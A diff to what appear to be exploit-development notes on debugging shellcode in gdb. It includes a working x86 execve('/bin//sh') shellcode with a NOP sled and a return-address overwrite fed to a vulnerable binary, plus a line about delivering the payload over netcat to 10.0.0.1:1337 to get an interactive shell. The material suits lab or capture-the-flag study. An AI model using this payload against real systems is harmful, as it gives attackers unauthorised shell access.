@@ -23,9 +23,15 @@ Debugging shellcode in gdb - open binary, set a breakpoint at the start of the v
 
 ```
 gdb ./binary
-b vuln_func
-r < <(python2 -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*111 + "\x90"*4 + "\x80\xa0\x04\x08"')
+(gdb) b vuln_func
+(gdb) r < <(python2 -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*111 + "\x90"*4 + "\x80\xa0\x04\x08"')
 ```
+In gdb, just before a vulnerable function returns examine two words before above the frame's base pointer to verify the correct return address has been set:
+
+```
+(gdb) x/2xw $ebp
+```
+
 Send the payload to server 10.0.0.1, listening on port 1337. Note the appended cat command keeps the netcat sesssion open, granting an interactive shell:
 
 ```
